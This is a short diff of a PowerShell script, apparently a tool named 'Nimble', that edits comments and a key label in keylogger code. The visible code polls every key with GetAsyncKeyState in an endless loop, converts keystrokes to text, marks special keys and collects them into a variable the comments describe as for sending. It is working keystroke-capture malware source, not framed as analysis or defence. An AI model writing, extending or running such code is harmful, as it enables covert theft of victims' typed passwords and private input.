@@ -48,8 +48,6 @@ Nimble – Quick and light in movement or action.
 
 #>
 
-
-# Import DLL Definitions for keyboard inputs
 $defs = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -65,7 +63,6 @@ $defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
-# Start a continuous loop
 While ($true){
   $keyPressed = $false
     try{
@@ -92,7 +89,7 @@ While ($true){
             if ($defs::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
               # Check for non-character keys
               $LString = $logchar.ToString()
-                if ($asc -eq 8) {$LString = "[BKSP]"}
+                if ($asc -eq 8) {$LString = "[BACK]"}
                 if ($asc -eq 13) {$LString = "[ENT]"}
                 if ($asc -eq 27) {$LString = "[ESC]"}
             # Add the key to sending variable
